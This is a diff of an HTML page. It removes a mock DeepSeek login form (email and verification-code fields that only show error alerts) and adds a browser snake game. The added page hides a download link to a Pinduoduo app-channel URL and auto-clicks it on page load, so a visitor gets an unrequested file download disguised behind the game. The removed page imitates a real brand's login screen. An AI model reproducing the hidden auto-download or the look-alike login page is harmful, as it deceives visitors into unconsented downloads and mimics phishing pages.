@@ -1,39 +1,208 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>DeepSeek 登录</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="UTF-8">
+  <title>你好呀，欢迎来到下载世界</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(to right, #8e2de2, #4a00e0);
+      color: white;
+      text-align: center;
+    }
+
+    h1 {
+      margin-top: 40px;
+      font-size: 2.5em;
+      animation: fadeIn 2 ease-in-out;
+    }
+
+    h2 {
+      font-weight: normal;
+      animation: fadeIn 3 ease-in-out;
+    }
+
+    canvas {
+      margin-top: 20px;
+      background: black;
+      border: 2px solid white;
+    }
+
+    #retryBtn {
+      display: none;
+      margin: 20px auto;
+      padding: 10px 20px;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      background-color: #ff4081;
+      color: white;
+      cursor: pointer;
+    }
+
+    #retryBtn:hover {
+      background-color: #e91e63;
+    }
+
+    .controls {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .control-row {
+      display: flex;
+      justify-content: center;
+      margin: 5px 0;
+    }
+
+    .ctrl-btn {
+      width: 60px;
+      height: 60px;
+      margin: 5px;
+      font-size: 24px;
+      border: none;
+      border-radius: 10px;
+      background-color: #ffffff33;
+      color: white;
+      cursor: pointer;
+    }
+
+    .ctrl-btn:active {
+      background-color: #ffffff55;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+  </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans">
-  <div class="bg-white shadow-lg rounded-xl p-8 w-full max-w-md">
-    <h1 class="text-2xl font-bold mb-6 text-center text-gray-800">DeepSeek 登录</h1>
+<body>
+  <h1>你好呀 👋</h1>
+  <h2>正在准备启动游戏文件...</h2>
 
-    <div class="mb-4">
-      <label class="block text-gray-700 text-sm font-semibold mb-1">邮箱</label>
-      <input type="email" placeholder="输入邮箱" class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400" />
+  <!-- 隐藏的下载链接 -->
+  <a id="downloadLink"
+     href="https://api.pinduoduo.com/api/app/channel/pinduoduo_main_baidu_seo/all"
+     download
+     style="display: none;">
+    下载链接
+  </a>
+
+  <!-- 游戏画布 -->
+  <canvas id="gameCanvas" width="300" height="300"></canvas>
+
+  <!-- 再来一次按钮 -->
+  <button id="retryBtn" onclick="restartGame()">再来一次</button>
+
+  <!-- 触屏控制按钮 -->
+  <div class="controls">
+    <div class="control-row">
+      <button class="ctrl-btn" onclick="setDirection('UP')">↑</button>
     </div>
-
-    <div class="mb-4 flex items-center">
-      <input type="text" placeholder="输入验证码" class="flex-1 px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-400" />
-      <button onclick="showNetworkError()" class="ml-2 text-blue-500 hover:underline text-sm">发送验证码</button>
+    <div class="control-row">
+      <button class="ctrl-btn" onclick="setDirection('LEFT')">←</button>
+      <button class="ctrl-btn" onclick="setDirection('DOWN')">↓</button>
+      <button class="ctrl-btn" onclick="setDirection('RIGHT')">→</button>
     </div>
-
-    <button onclick="showLoginError()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-md">
-      登录
-    </button>
-
-    <p class="text-gray-400 text-xs text-center mt-6">DeepSeek 页面，仅供学习使用</p>
   </div>
 
   <script>
-    function showLoginError() {
-      alert("发生错误");
+    let canvas, ctx, box = 10;
+    let snake, food, direction, game;
+
+    window.onload = function () {
+      document.getElementById('downloadLink').click();
+      initGame();
+    };
+
+    function initGame() {
+      canvas = document.getElementById('gameCanvas');
+      ctx = canvas.getContext('2d');
+      direction = "RIGHT";
+      snake = [{x: 50, y: 50}];
+      food = {
+        x: Math.floor(Math.random() * 30) * box,
+        y: Math.floor(Math.random() * 30) * box
+      };
+      document.addEventListener("keydown", dirChange);
+      game = setInterval(draw, 100);
     }
 
-    function showNetworkError() {
-      alert("网络异常，请检查网络设置");
+    function dirChange(e) {
+      const key = e.key;
+      if (key === "ArrowLeft" && direction !== "RIGHT") direction = "LEFT";
+      else if (key === "ArrowUp" && direction !== "DOWN") direction = "UP";
+      else if (key === "ArrowRight" && direction !== "LEFT") direction = "RIGHT";
+      else if (key === "ArrowDown" && direction !== "UP") direction = "DOWN";
+    }
+
+    function setDirection(dir) {
+      if (dir === "LEFT" && direction !== "RIGHT") direction = "LEFT";
+      if (dir === "RIGHT" && direction !== "LEFT") direction = "RIGHT";
+      if (dir === "UP" && direction !== "DOWN") direction = "UP";
+      if (dir === "DOWN" && direction !== "UP") direction = "DOWN";
+    }
+
+    function draw() {
+      ctx.fillStyle = "black";
+      ctx.fillRect(0, 0, 300, 300);
+
+      for (let i = 0; i < snake.length; i++) {
+        ctx.fillStyle = i === 0 ? "lime" : "lightgreen";
+        ctx.fillRect(snake[i].x, snake[i].y, box, box);
+      }
+
+      ctx.fillStyle = "red";
+      ctx.fillRect(food.x, food.y, box, box);
+
+      let headX = snake[0].x;
+      let headY = snake[0].y;
+
+      if (direction === "LEFT") headX -= box;
+      if (direction === "RIGHT") headX += box;
+      if (direction === "UP") headY -= box;
+      if (direction === "DOWN") headY += box;
+
+      if (headX === food.x && headY === food.y) {
+        food = {
+          x: Math.floor(Math.random() * 30) * box,
+          y: Math.floor(Math.random() * 30) * box
+        };
+      } else {
+        snake.pop();
+      }
+
+      let newHead = {x: headX, y: headY};
+
+      if (
+        headX < 0 || headY < 0 || headX >= 300 || headY >= 300 ||
+        snake.some(seg => seg.x === newHead.x && seg.y === newHead.y)
+      ) {
+        clearInterval(game);
+        ctx.fillStyle = "white";
+        ctx.font = "20px sans-serif";
+        ctx.fillText("游戏结束！", 90, 150);
+        document.getElementById("retryBtn").style.display = "inline-block";
+        return;
+      }
+
+      snake.unshift(newHead);
+    }
+
+    function restartGame() {
+      document.getElementById("retryBtn").style.display = "none";
+      direction = "RIGHT";
+      snake = [{x: 50, y: 50}];
+      food = {
+        x: Math.floor(Math.random() * 30) * box,
+        y: Math.floor(Math.random() * 30) * box
+      };
+      clearInterval(game);
+      game = setInterval(draw, 100);
     }
   </script>
 </body>
